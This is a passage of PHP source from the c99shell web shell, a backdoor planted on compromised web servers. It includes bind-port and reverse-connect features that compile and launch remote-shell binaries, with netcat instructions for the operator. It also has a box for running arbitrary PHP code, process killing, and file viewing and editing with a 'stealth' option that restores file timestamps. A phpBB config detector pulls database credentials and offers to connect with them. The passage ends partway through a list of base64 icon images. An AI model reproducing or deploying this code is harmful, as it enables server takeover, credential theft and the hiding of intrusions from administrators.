 if ($win) {echo "<b>Binding port and Back connect:</b><br>This functions not work in Windows!<br><br>";}
 else
 {
  if (!is_array($bind)) {$bind = array();}
  if (!is_array($bc)) {$bc = array();}
  if (!is_numeric($bind["port"])) {$bind["port"] = $bindport_port;}
  if (empty($bind["pass"])) {$bind["pass"] = $bindport_pass;}
  if (empty($bc["host"])) {$bc["host"] = getenv("REMOTE_ADDR");}
  if (!is_numeric($bc["port"])) {$bc["port"] = $bc_port;}
  if (!empty($bindsubmit))
  {
   echo "<b>Result of binding port:</b><br>";
   $v = $bndportsrcs[$bind["src"]];
   if (empty($v)) {echo "Unknown file!<br>";}
   elseif (fsockopen(getenv("SERVER_ADDR"),$bind["port"],$errno,$errstr,0.1)) {echo "Port alredy in use, select any other!<br>";}
   else
   {
    $srcpath = $tmpdir.$bind["src"];
    $w = explode(".",$bind["src"]);
    $ext = $w[count($w)-1];
    unset($w[count($w)-1]);
    $srcpath = join(".",$w).".".rand(0,999).".".$ext;
    $binpath = $tmpdir.join(".",$w).rand(0,999);
    if ($ext == "pl") {$binpath = $srcpath;}
    @unlink($srcpath);
    $fp = fopen($srcpath,"ab+");
    if (!$fp) {echo "Can't write sources to \"".$srcpath."\"!<br>";}
    else
    {
     $data = c99getsource($bind["src"]);
     fwrite($fp,$data,strlen($data));
     fclose($fp);
     if ($ext == "c") {$retgcc = myshellexec("gcc -o ".$binpath." ".$srcpath);  @unlink($srcpath);}
     $v[1] = str_replace("%path",$binpath,$v[1]);
     $v[1] = str_replace("%port",$bind["port"],$v[1]);
     $v[1] = str_replace("%pass",$bind["pass"],$v[1]);
     $v[1] = str_replace("//","/",$v[1]);
     $retbind = myshellexec($v[1]." > /dev/null &");
     sleep(5);
     $sock = fsockopen("localhost",$bind["port"],$errno,$errstr,5);
     if (!$sock) {echo "I can't connect to localhost:".$bind["port"]."! I think you should configure your firewall.";}
     else {echo "Binding... ok! Connect to <b>".getenv("SERVER_ADDR").":".$bind["port"]."</b>! You should use NetCat&copy;, run \"<b>nc -v ".getenv("SERVER_ADDR")." ".$bind["port"]."</b>\"!<center><a href=\"".$surl."act=processes&grep=".basename($binpath)."\"><u>View binder's process</u></a></center>";}
    }
    echo "<br>";
   }
  }
  if (!empty($bcsubmit))
  {
   echo "<b>Result of back connection:</b><br>";
   $v = $bcsrcs[$bc["src"]];
   if (empty($v)) {echo "Unknown file!<br>";}
   else
   {
    $srcpath = $tmpdir.$bc["src"];
    $w = explode(".",$bc["src"]);
    $ext = $w[count($w)-1];
    unset($w[count($w)-1]);
    $binpath = $tmpdir.join(".",$w);
    if ($ext == "pl") {$binpath = $srcpath;}
    @unlink($srcpath);
    $fp = fopen($srcpath,"ab+");
    if (!$fp) {echo "Can't write sources to \"".$srcpath."\"!<br>";}
    else
    {
     $data = c99getsource($bc["src"]);
     fwrite($fp,$data,strlen($data));
     fclose($fp);
     if ($ext == "c") {$retgcc = myshellexec("gcc -o ".$binpath." ".$srcpath); @unlink($srcpath);}
     $v[1] = str_replace("%path",$binpath,$v[1]);
     $v[1] = str_replace("%host",$bc["host"],$v[1]);
     $v[1] = str_replace("%port",$bc["port"],$v[1]);
     $v[1] = str_replace("//","/",$v[1]);
     $retbind = myshellexec($v[1]." > /dev/null &");
     echo "Now script try connect to ".htmlspecialchars($bc["host"]).":".htmlspecialchars($bc["port"])."...<br>";
    }
   }
  }
  ?><b>Binding port:</b><br><form method="POST"><input type=hidden name=act value="bind"><input type=hidden name="d" value="<?php echo $d; ?>">Port: <input type="text" name="bind[port]" value="<?php echo htmlspecialchars($bind["port"]); ?>">&nbsp;Password: <input type="text" name="bind[pass]" value="<?php echo htmlspecialchars($bind["pass"]); ?>">&nbsp;<select name="bind[src]"><?php
foreach($bndportsrcs as $k=>$v) {echo "<option value=\"".$k."\""; if ($k == $bind["src"]) {echo " selected";} echo ">".$v[0]."</option>";}
?></select>&nbsp;<input type=submit name="bindsubmit" value="Bind"></form>
<b>Back connection:</b><br><form method="POST"><input type=hidden name=act value="bind"><input type=hidden name="d" value="<?php echo $d; ?>">HOST: <input type="text" name="bc[host]" value="<?php echo htmlspecialchars($bc["host"]); ?>">&nbsp;Port: <input type="text" name="bc[port]" value="<?php echo htmlspecialchars($bc["port"]); ?>">&nbsp;<select name="bc[src]"><?php
foreach($bcsrcs as $k=>$v) {echo "<option value=\"".$k."\""; if ($k == $bc["src"]) {echo " selected";} echo ">".$v[0]."</option>";}
?></select>&nbsp;<input type=submit name="bcsubmit" value="Connect"></form>
Click "Connect" only after open port for it. You should use NetCat&copy;, run "<b>nc -l -n -v -p <?php echo $bc_port; ?></b>"!<?php
 }
}
if ($act == "processes")
{
 echo "<b>Processes:</b><br>";
 if (!$win) {$handler = "ps -aux | grep '".addslashes($grep)."'";}
 else {$handler = "tasklist";}
 $ret = myshellexec($handler);
 if (!$ret) {echo "Can't execute \"".$handler."\"!";}
 else
 {
  if (empty($processes_sort)) {$processes_sort = $sort_default;}
  $parsesort = parsesort($processes_sort);
  if (!is_numeric($parsesort[0])) {$parsesort[0] = 0;}
  $k = $parsesort[0];
  if ($parsesort[1] != "a") {$y = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."a\"><img src=\"".$surl."act=img&img=sort_desc\" height=\"9\" width=\"14\" border=\"0\"></a>";}
  else {$y = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."d\"><img src=\"".$surl."act=img&img=sort_asc\" height=\"9\" width=\"14\" border=\"0\"></a>";}
  $ret = htmlspecialchars($ret);
  if (!$win)
  {
   if ($pid)
   {
    if (!$sig) {$sig = 9;}
    echo "Sending signal ".$sig." to #".$pid."... ";
    $ret = posix_kill($pid,$sig);
    if ($ret) {echo "OK.";}
    else {echo "ERROR.";}
   }
   while (ereg("  ",$ret)) {$ret = str_replace("  "," ",$ret);}
   $stack = explode("\n",$ret);
   $head = explode(" ",$stack[0]);
   unset($stack[0]);
   for($i=0;$i<count($head);$i++)
   {
    if ($i != $k) {$head[$i] = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$i.$parsesort[1]."\"><b>".$head[$i]."</b></a>";}
   }
   $prcs = array();
   foreach ($stack as $line)
   {
    if (!empty($line))
        {
         echo "<tr>";
     $line = explode(" ",$line);
     $line[10] = join(" ",array_slice($line,10));
     $line = array_slice($line,0,11);
     if ($line[0] == get_current_user()) {$line[0] = "<font color=green>".$line[0]."</font>";}
     $line[] = "<a href=\"".$surl."act=processes&d=".urlencode($d)."&pid=".$line[1]."&sig=9\"><u>KILL</u></a>";
     $prcs[] = $line;
     echo "</tr>";
    }
   }
  }
  else
  {
   while (ereg("  ",$ret)) {$ret = str_replace("  ","        ",$ret);}
   while (ereg("                ",$ret)) {$ret = str_replace("                ","        ",$ret);}
   while (ereg("         ",$ret)) {$ret = str_replace("         ","        ",$ret);}
   $ret = convert_cyr_string($ret,"d","w");
   $stack = explode("\n",$ret);
   unset($stack[0],$stack[2]);
   $stack = array_values($stack);
   $head = explode("        ",$stack[0]);
   $head[1] = explode(" ",$head[1]);
   $head[1] = $head[1][0];
   $stack = array_slice($stack,1);
   unset($head[2]);
   $head = array_values($head);
   if ($parsesort[1] != "a") {$y = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."a\"><img src=\"".$surl."act=img&img=sort_desc\" height=\"9\" width=\"14\" border=\"0\"></a>";}
   else {$y = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."d\"><img src=\"".$surl."act=img&img=sort_asc\" height=\"9\" width=\"14\" border=\"0\"></a>";}
   if ($k > count($head)) {$k = count($head)-1;}
   for($i=0;$i<count($head);$i++)
   {
    if ($i != $k) {$head[$i] = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$i.$parsesort[1]."\"><b>".trim($head[$i])."</b></a>";}
   }
   $prcs = array();
   foreach ($stack as $line)
   {
    if (!empty($line))
    {
     echo "<tr>";
     $line = explode("        ",$line);
     $line[1] = intval($line[1]); $line[2] = $line[3]; unset($line[3]);
     $line[2] = intval(str_replace(" ","",$line[2]))*1024;
     $prcs[] = $line;
     echo "</tr>";
    }
   }
  }
  $head[$k] = "<b>".$head[$k]."</b>".$y;
  $v = $processes_sort[0];
  usort($prcs,"tabsort");
  if ($processes_sort[1] == "d") {$prcs = array_reverse($prcs);}
  $tab = array();
  $tab[] = $head;
  $tab = array_merge($tab,$prcs);
  echo "<TABLE height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor=\"#C0C0C0\">";
  foreach($tab as $i=>$k)
  {
   echo "<tr>";
   foreach($k as $j=>$v) {if ($win and $i > 0 and $j == 2) {$v = view_size($v);} echo "<td>".$v."</td>";}
   echo "</tr>";
  }
  echo "</table>";
 }
}
if ($act == "eval")
{
 if (!empty($eval))
 {
  echo "<b>Result of execution this PHP-code</b>:<br>";
  $tmp = ob_get_contents();
  $olddir = realpath(".");
  @chdir($d);
  if ($tmp)
  {
   ob_clean();
   eval($eval);
   $ret = ob_get_contents();
   $ret = convert_cyr_string($ret,"d","w");
   ob_clean();
   echo $tmp;
   if ($eval_txt)
   {
    $rows = count(explode("\r\n",$ret))+1;
    if ($rows < 10) {$rows = 10;}
    echo "<br><textarea cols=\"122\" rows=\"".$rows."\" readonly>".htmlspecialchars($ret)."</textarea>";
   }
   else {echo $ret."<br>";}
  }
  else
  {
   if ($eval_txt)
   {
    echo "<br><textarea cols=\"122\" rows=\"15\" readonly>";
    eval($eval);
    echo "</textarea>";
   }
   else {echo $ret;}
  }
  @chdir($olddir);
 }
 else {echo "<b>Execution PHP-code</b>"; if (empty($eval_txt)) {$eval_txt = true;}}
 echo "<form method=\"POST\"><textarea name=\"eval\" cols=\"122\" rows=\"10\">".htmlspecialchars($eval)."</textarea><input type=hidden name=\"d\" value=\"".$dispd."\"><br><br><input type=submit value=\"Execute\">&nbsp;Display in text-area&nbsp;<input type=\"checkbox\" name=\"eval_txt\" value=\"1\""; if ($eval_txt) {echo " checked";} echo "></form>";
}
if ($act == "f")
{
 if ((!is_readable($d.$f) or is_dir($d.$f)) and $ft != "edit")
 {
  if (file_exists($d.$f)) {echo "<center><b>Permision denied (".htmlspecialchars($d.$f).")!</b></center>";}
  else {echo "<center><b>File does not exists (".htmlspecialchars($d.$f).")!</b><br><a href=\"".$surl."act=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."&c=1\"><u>Create</u></a></center>";}
 }
 else
 {
  $r = @file_get_contents($d.$f);
  $ext = explode(".",$f);
  $c = count($ext)-1;
  $ext = $ext[$c];
  $ext = strtolower($ext);
  $rft = "";
  foreach($ftypes as $k=>$v) {if (in_array($ext,$v)) {$rft = $k; break;}}
  if (eregi("sess_(.*)",$f)) {$rft = "phpsess";}
  if (empty($ft)) {$ft = $rft;}
  $arr = array(
   array("<img src=\"".$surl."act=img&img=ext_diz\" border=\"0\">","info"),
   array("<img src=\"".$surl."act=img&img=ext_html\" border=\"0\">","html"),
   array("<img src=\"".$surl."act=img&img=ext_txt\" border=\"0\">","txt"),
   array("Code","code"),
   array("Session","phpsess"),
   array("<img src=\"".$surl."act=img&img=ext_exe\" border=\"0\">","exe"),
   array("SDB","sdb"),
   array("<img src=\"".$surl."act=img&img=ext_gif\" border=\"0\">","img"),
   array("<img src=\"".$surl."act=img&img=ext_ini\" border=\"0\">","ini"),
   array("<img src=\"".$surl."act=img&img=download\" border=\"0\">","download"),
   array("<img src=\"".$surl."act=img&img=ext_rtf\" border=\"0\">","notepad"),
   array("<img src=\"".$surl."act=img&img=change\" border=\"0\">","edit")
  );
  echo "<b>Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;<img src=\"".$surl."act=img&img=ext_".$ext."\" border=\"0\">&nbsp;".$f." (".view_size(filesize($d.$f)).") &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".view_perms_color($d.$f)."</b><br>Select action/file-type:<br>";
  foreach($arr as $t)
  {
   if ($t[1] == $rft) {echo " <a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><font color=green>".$t[0]."</font></a>";}
   elseif ($t[1] == $ft) {echo " <a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><b><u>".$t[0]."</u></b></a>";}
   else {echo " <a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><b>".$t[0]."</b></a>";}
   echo " (<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&white=1&d=".urlencode($d)."\" target=\"_blank\">+</a>) |";
  }
  echo "<hr size=\"1\" noshade>";
  if ($ft == "info")
  {
   echo "<b>Information:</b><table border=0 cellspacing=1 cellpadding=2><tr><td><b>Path</b></td><td> ".$d.$f."</td></tr><tr><td><b>Size</b></td><td> ".view_size(filesize($d.$f))."</td></tr><tr><td><b>MD5</b></td><td> ".md5_file($d.$f)."</td></tr>";
   if (!$win)
   {
    echo "<tr><td><b>Owner/Group</b></td><td> ";
    $tmp = posix_getpwuid(fileowner($d.$f));
    if ($tmp["name"] == "") {echo fileowner($d.$f)."/";}
    else {echo $tmp["name"]."/";}
    $tmp = posix_getgrgid(filegroup($d.$f));
    if ($tmp["name"] == "") {echo filegroup($d.$f);}
    else {echo $tmp["name"];}
   }
   echo "<tr><td><b>Perms</b></td><td><a href=\"".$surl."act=chmod&f=".urlencode($f)."&d=".urlencode($d)."\">".view_perms_color($d.$f)."</a></td></tr><tr><td><b>Create time</b></td><td> ".date("d/m/Y H:i:s",filectime($d.$f))."</td></tr><tr><td><b>Access time</b></td><td> ".date("d/m/Y H:i:s",fileatime($d.$f))."</td></tr><tr><td><b>MODIFY time</b></td><td> ".date("d/m/Y H:i:s",filemtime($d.$f))."</td></tr></table><br>";
   $fi = fopen($d.$f,"rb");
   if ($fi)
   {
    if ($fullhexdump) {echo "<b>FULL HEXDUMP</b>"; $str = fread($fi,filesize($d.$f));}
    else {echo "<b>HEXDUMP PREVIEW</b>"; $str = fread($fi,$hexdump_lines*$hexdump_rows);}
    $n = 0;
    $a0 = "00000000<br>";
    $a1 = "";
    $a2 = "";
    for ($i=0; $i<strlen($str); $i++)
    {
     $a1 .= sprintf("%02X",ord($str[$i]))." ";
     switch (ord($str[$i]))
     {
      case 0:  $a2 .= "<font>0</font>"; break;
      case 32:
      case 10:
      case 13: $a2 .= "&nbsp;"; break;
      default: $a2 .= htmlspecialchars($str[$i]);
     }
     $n++;
     if ($n == $hexdump_rows)
     {
      $n = 0;
      if ($i+1 < strlen($str)) {$a0 .= sprintf("%08X",$i+1)."<br>";}
      $a1 .= "<br>";
      $a2 .= "<br>";
     }
    }
    //if ($a1 != "") {$a0 .= sprintf("%08X",$i)."<br>";}
    echo "<table border=0 bgcolor=#666666 cellspacing=1 cellpadding=4><tr><td bgcolor=#666666>".$a0."</td><td bgcolor=000000>".$a1."</td><td bgcolor=000000>".$a2."</td></tr></table><br>";
   }
   $encoded = "";
   if ($base64 == 1)
   {
    echo "<b>Base64 Encode</b><br>";
    $encoded = base64_encode(file_get_contents($d.$f));
   }
   elseif($base64 == 2)
   {
    echo "<b>Base64 Encode + Chunk</b><br>";
    $encoded = chunk_split(base64_encode(file_get_contents($d.$f)));
   }
   elseif($base64 == 3)
   {
    echo "<b>Base64 Encode + Chunk + Quotes</b><br>";
    $encoded = base64_encode(file_get_contents($d.$f));
    $encoded = substr(preg_replace("!.{1,76}!","'\\0'.\n",$encoded),0,-2);
   }
   elseif($base64 == 4)
   {
    $text = file_get_contents($d.$f);
    $encoded = base64_decode($text);
    echo "<b>Base64 Decode";
    if (base64_encode($encoded) != $text) {echo " (failed)";}
    echo "</b><br>";
   }
   if (!empty($encoded))
   {
    echo "<textarea cols=80 rows=10>".htmlspecialchars($encoded)."</textarea><br><br>";
   }
   echo "<b>HEXDUMP:</b><nobr> [<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&fullhexdump=1&d=".urlencode($d)."\">Full</a>] [<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&d=".urlencode($d)."\">Preview</a>]<br><b>Base64: </b>
<nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=1&d=".urlencode($d)."\">Encode</a>]&nbsp;</nobr>
<nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=2&d=".urlencode($d)."\">+chunk</a>]&nbsp;</nobr>
<nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=3&d=".urlencode($d)."\">+chunk+quotes</a>]&nbsp;</nobr>
<nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=4&d=".urlencode($d)."\">Decode</a>]&nbsp;</nobr>
<P>";
  }
  elseif ($ft == "html")
  {
   if ($white) {@ob_clean();}
   echo $r;
   if ($white) {c99shexit();}
  }
  elseif ($ft == "txt") {echo "<pre>".htmlspecialchars($r)."</pre>";}
  elseif ($ft == "ini") {echo "<pre>"; var_dump(parse_ini_file($d.$f,true)); echo "</pre>";}
  elseif ($ft == "phpsess")
  {
   echo "<pre>";
   $v = explode("|",$r);
   echo $v[0]."<br>";
   var_dump(unserialize($v[1]));
   echo "</pre>";
  }
  elseif ($ft == "exe")
  {
   $ext = explode(".",$f);
   $c = count($ext)-1;
   $ext = $ext[$c];
   $ext = strtolower($ext);
   $rft = "";
   foreach($exeftypes as $k=>$v)
   {
    if (in_array($ext,$v)) {$rft = $k; break;}
   }
   $cmd = str_replace("%f%",$f,$rft);
   echo "<b>Execute file:</b><form action=\"".$surl."act=cmd\" method=\"POST\"><input type=\"text\" name=\"cmd\" value=\"".htmlspecialchars($cmd)."\" size=\"".(strlen($cmd)+2)."\"><br>Display in text-area<input type=\"checkbox\" name=\"cmd_txt\" value=\"1\" checked><input type=hidden name=\"d\" value=\"".htmlspecialchars($d)."\"><br><input type=submit name=submit value=\"Execute\"></form>";
  }
  elseif ($ft == "sdb") {echo "<pre>"; var_dump(unserialize(base64_decode($r))); echo "</pre>";}
  elseif ($ft == "code")
  {
   if (ereg("php"."BB 2.(.*) auto-generated config file",$r))
   {
    $arr = explode("\n",$r);
    if (count($arr == 18))
    {
     include($d.$f);
     echo "<b>phpBB configuration is detected in this file!<br>";
     if ($dbms == "mysql4") {$dbms = "mysql";}
     if ($dbms == "mysql") {echo "<a href=\"".$surl."act=sql&sql_server=".htmlspecialchars($dbhost)."&sql_login=".htmlspecialchars($dbuser)."&sql_passwd=".htmlspecialchars($dbpasswd)."&sql_port=3306&sql_db=".htmlspecialchars($dbname)."\"><b><u>Connect to DB</u></b></a><br><br>";}
     else {echo "But, you can't connect to forum sql-base, because db-software=\"".$dbms."\" is not supported by c99shell. Please, report us for fix.";}
     echo "Parameters for manual connect:<br>";
     $cfgvars = array("dbms"=>$dbms,"dbhost"=>$dbhost,"dbname"=>$dbname,"dbuser"=>$dbuser,"dbpasswd"=>$dbpasswd);
     foreach ($cfgvars as $k=>$v) {echo htmlspecialchars($k)."='".htmlspecialchars($v)."'<br>";}
     echo "</b><hr size=\"1\" noshade>";
    }
   }
   echo "<div style=\"border : 0px solid #FFFFFF; padding: 1em; margin-top: 1em; margin-bottom: 1em; margin-right: 1em; margin-left: 1em; background-color: ".$highlight_background .";\">";
   if (!empty($white)) {@ob_clean();}
   highlight_file($d.$f);
   if (!empty($white)) {c99shexit();}
   echo "</div>";
  }
  elseif ($ft == "download")
  {
   @ob_clean();
   header("Content-type: application/octet-stream");
   header("Content-length: ".filesize($d.$f));
   header("Content-disposition: attachment; filename=\"".$f."\";");
   echo $r;
   exit;
  }
  elseif ($ft == "notepad")
  {
   @ob_clean();
   header("Content-type: text/plain");
   header("Content-disposition: attachment; filename=\"".$f.".txt\";");
   echo($r);
   exit;
  }
  elseif ($ft == "img")
  {
   $inf = getimagesize($d.$f);
   if (!$white)
   {
    if (empty($imgsize)) {$imgsize = 20;}
    $width = $inf[0]/100*$imgsize;
    $height = $inf[1]/100*$imgsize;
    echo "<center><b>Size:</b>&nbsp;";
    $sizes = array("100","50","20");
    foreach ($sizes as $v)
    {
     echo "<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=img&d=".urlencode($d)."&imgsize=".$v."\">";
     if ($imgsize != $v ) {echo $v;}
     else {echo "<u>".$v."</u>";}
     echo "</a>&nbsp;&nbsp;&nbsp;";
    }
    echo "<br><br><img src=\"".$surl."act=f&f=".urlencode($f)."&ft=img&white=1&d=".urlencode($d)."\" width=\"".$width."\" height=\"".$height."\" border=\"1\"></center>";
   }
   else
   {
    @ob_clean();
    $ext = explode($f,".");
    $ext = $ext[count($ext)-1];
    header("Content-type: ".$inf["mime"]);
    readfile($d.$f);
    exit;
   }
  }
  elseif ($ft == "edit")
  {
   if (!empty($submit))
   {
    if ($filestealth) {$stat = stat($d.$f);}
    $fp = fopen($d.$f,"w");
    if (!$fp) {echo "<b>Can't write to file!</b>";}
    else
    {
     echo "<b>Saved!</b>";
     fwrite($fp,$edit_text);
     fclose($fp);
     if ($filestealth) {touch($d.$f,$stat[9],$stat[8]);}
     $r = $edit_text;
    }
   }
   $rows = count(explode("\r\n",$r));
   if ($rows < 10) {$rows = 10;}
   if ($rows > 30) {$rows = 30;}
   echo "<form action=\"".$surl."act=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."\" method=\"POST\"><input type=submit name=submit value=\"Save\">&nbsp;<input type=\"reset\" value=\"Reset\">&nbsp;<input type=\"button\" onclick=\"location.href='".addslashes($surl."act=ls&d=".substr($d,0,-1))."';\" value=\"Back\"><br><textarea name=\"edit_text\" cols=\"122\" rows=\"".$rows."\">".htmlspecialchars($r)."</textarea></form>";
  }
  elseif (!empty($ft)) {echo "<center><b>Manually selected type is incorrect. If you think, it is mistake, please send us url and dump of \$GLOBALS.</b></center>";}
  else {echo "<center><b>Unknown extension (".$ext."), please, select type manually.</b></center>";}
 }
}
}
else
{
 @ob_clean();
 $images = array(
"arrow_ltr"=>
"R0lGODlhJgAWAIAAAAAAAP///yH5BAUUAAEALAAAAAAmABYAAAIvjI+py+0PF4i0gVvzuVxXDnoQ".
"SIrUZGZoerKf28KjPNPOaku5RfZ+uQsKh8RiogAAOw==",
"back"=>
"R0lGODlhFAAUAKIAAAAAAP///93d3cDAwIaGhgQEBP///wAAACH5BAEAAAYALAAAAAAUABQAAAM8".
"aLrc/jDKSWWpjVysSNiYJ4CUOBJoqjniILzwuzLtYN/3zBSErf6kBW+gKRiPRghPh+EFK0mOUEqt".
"Wg0JADs=",
"buffer"=>
"R0lGODlhFAAUAKIAAAAAAP////j4+N3d3czMzLKysoaGhv///yH5BAEAAAcALAAAAAAUABQAAANo".
"eLrcribG90y4F1Amu5+NhY2kxl2CMKwrQRSGuVjp4LmwDAWqiAGFXChg+xhnRB+ptLOhai1crEmD".
"Dlwv4cEC46mi2YgJQKaxsEGDFnnGwWDTEzj9jrPRdbhuG8Cr/2INZIOEhXsbDwkAOw==",
"change"=>
"R0lGODlhFAAUAMQfAL3hj7nX+pqo1ejy/f7YAcTb+8vh+6FtH56WZtvr/RAQEZecx9Ll/PX6/v3+".
"/3eHt6q88eHu/ZkfH3yVyIuQt+72/kOm99fo/P8AZm57rkGS4Hez6pil9oep3GZmZv///yH5BAEA".
"AB8ALAAAAAAUABQAAAWf4CeOZGme6NmtLOulX+c4TVNVQ7e9qFzfg4HFonkdJA5S54cbRAoFyEOC".
"wSiUtmYkkrgwOAeA5zrqaLldBiNMIJeD266XYTgQDm5Rx8mdG+oAbSYdaH4Ga3c8JBMJaXQGBQgA".
"CHkjE4aQkQ0AlSITan+ZAQqkiiQPj1AFAaMKEKYjD39QrKwKAa8nGQK8Agu/CxTCsCMexsfIxjDL".
"zMshADs=",
"delete"=>
"R0lGODlhFAAUAOZZAPz8/NPFyNgHLs0YOvPz8/b29sacpNXV1fX19cwXOfDw8Kenp/n5+etgeunp".
"6dcGLMMpRurq6pKSktvb2+/v7+1wh3R0dPnP17iAipxyel9fX7djcscSM93d3ZGRkeEsTevd4LCw".
"sGRkZGpOU+IfQ+EQNoh6fdIcPeHh4YWFhbJQYvLy8ui+xm5ubsxccOx8kcM4UtY9WeAdQYmJifWv".
"vHx8fMnJycM3Uf3v8rRue98ONbOzs9YFK5SUlKYoP+Tk5N0oSufn57ZGWsQrR9kIL5CQkOPj42Vl".
"ZeAPNudAX9sKMPv7+15QU5ubm39/f8e5u4xiatra2ubKz8PDw+pfee9/lMK0t81rfd8AKf///wAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5".
"BAEAAFkALAAAAAAUABQAAAesgFmCg4SFhoeIhiUfIImIMlgQB46GLAlYQkaFVVhSAIZLT5cbEYI4".
"STo5MxOfhQwBA1gYChckQBk1OwiIALACLkgxJilTBI69RFhDFh4HDJRZVFgPPFBR0FkNWDdMHA8G".
"BZTaMCISVgMC4IkVWCcaPSi96OqGNFhKI04dgr0QWFcKDL3A4uOIjVZZABxQIWDBLkIEQrRoQsHQ".
"jwVFHBgiEGQFIgQasYkcSbJQIAA7",
"download"=>
"R0lGODlhFAAUALMIAAD/AACAAIAAAMDAwH9/f/8AAP///wAAAP///wAAAAAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAgALAAAAAAUABQAAAROEMlJq704UyGOvkLhfVU4kpOJSpx5nF9YiCtLf0SuH7pu".
"EYOgcBgkwAiGpHKZzB2JxADASQFCidQJsMfdGqsDJnOQlXTP38przWbX3qgIADs=",
"forward"=>
"R0lGODlhFAAUAPIAAAAAAP///93d3cDAwIaGhgQEBP///wAAACH5BAEAAAYALAAAAAAUABQAAAM8".
"aLrc/jDK2Qp9xV5WiN5G50FZaRLD6IhE66Lpt3RDbd9CQFSE4P++QW7He7UKPh0IqVw2l0RQSEqt".
"WqsJADs=",
"home"=>
"R0lGODlhFAAUALMAAAAAAP///+rq6t3d3czMzLKysoaGhmZmZgQEBP///wAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAkALAAAAAAUABQAAAR+MMk5TTWI6ipyMoO3cUWRgeJoCCaLoKO0mq0ZxjNSBDWS".
"krqAsLfJ7YQBl4tiRCYFSpPMdRRCoQOiL4i8CgZgk09WfWLBYZHB6UWjCequwEDHuOEVK3QtgN/j".
"VwMrBDZvgF+ChHaGeYiCBQYHCH8VBJaWdAeSl5YiW5+goBIRADs=",
"mode"=>
"R0lGODlhHQAUALMAAAAAAP///6CgpN3d3czMzIaGhmZmZl9fX////wAAAAAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAgALAAAAAAdABQAAASBEMlJq70461m6/+AHZMUgnGiqniNWHHAsz3F7FUGu73xO".
"2BZcwGDoEXk/Uq4ICACeQ6fzmXTlns0ddle99b7cFvYpER55Z10Xy1lKt8wpoIsACrdaqBpYEYK/".
"dH1LRWiEe0pRTXBvVHwUd3o6eD6OHASXmJmamJUSY5+gnxujpBIRADs=",
"refresh"=>
"R0lGODlhEQAUALMAAAAAAP////Hx8erq6uPj493d3czMzLKysoaGhmZmZl9fXwQEBP///wAAAAAA".
"AAAAACH5BAEAAAwALAAAAAARABQAAAR1kMlJq0Q460xR+GAoIMvkheIYlMyJBkJ8lm6YxMKi6zWY".
"3AKCYbjo/Y4EQqFgKIYUh8EvuWQ6PwPFQJpULpunrXZLrYKx20G3oDA7093Esv19q5O/woFu9ZAJ".
"R3lufmWCVX13h3KHfWWMjGBDkpOUTTuXmJgRADs=",
"search"=>
"R0lGODlhFAAUALMAAAAAAP///+rq6t3d3czMzMDAwLKysoaGhnd3d2ZmZl9fX01NTSkpKQQEBP//".
"/wAAACH5BAEAAA4ALAAAAAAUABQAAASn0Ml5qj0z5xr6+JZGeUZpHIqRNOIRfIYiy+a6vcOpHOap".
"s5IKQccz8XgK4EGgQqWMvkrSscylhoaFVmuZLgUDAnZxEBMODSnrkhiSCZ4CGrUWMA+LLDxuSHsD".
"AkN4C3sfBX10VHaBJ4QfA4eIU4pijQcFmCVoNkFlggcMRScNSUCdJyhoDasNZ5MTDVsXBwlviRmr".
"Cbq7C6sIrqawrKwTv68iyA6rDhEAOw==",
"setup"=>
"R0lGODlhFAAUAMQAAAAAAP////j4+OPj493d3czMzMDAwLKyspaWloaGhnd3d2ZmZl9fX01NTUJC".
"QhwcHP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEA".
"ABAALAAAAAAUABQAAAWVICSKikKWaDmuShCUbjzMwEoGhVvsfHEENRYOgegljkeg0PF4KBIFRMIB".
"qCaCJ4eIGQVoIVWsTfQoXMfoUfmMZrgZ2GNDPGII7gJDLYErwG1vgW8CCQtzgHiJAnaFhyt2dwQE".
"OwcMZoZ0kJKUlZeOdQKbPgedjZmhnAcJlqaIqUesmIikpEixnyJhulUMhg24aSO6YyEAOw==",
"small_dir"=>
"R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp".
"/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=",
"small_unk"=>
